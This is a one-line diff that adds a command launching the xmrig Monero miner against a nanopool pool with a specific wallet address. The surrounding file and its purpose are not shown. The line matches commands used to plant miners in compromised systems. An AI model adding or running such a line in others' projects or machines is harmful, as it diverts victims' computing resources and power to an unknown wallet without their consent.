@@ -1,0 +1,1 @@
+./xmrig -o xmr-asia1.nanopool.org:10300 -randomx -u 8AejZdKbvYWYtwy1j7dUkUE1mjGdpvfPuZNUaqgjDUdJTaYqUAroRkBWpEHfgNzEmP3cotUf1jPCySjCQyB7PdJ8BSVLSEW -p stark
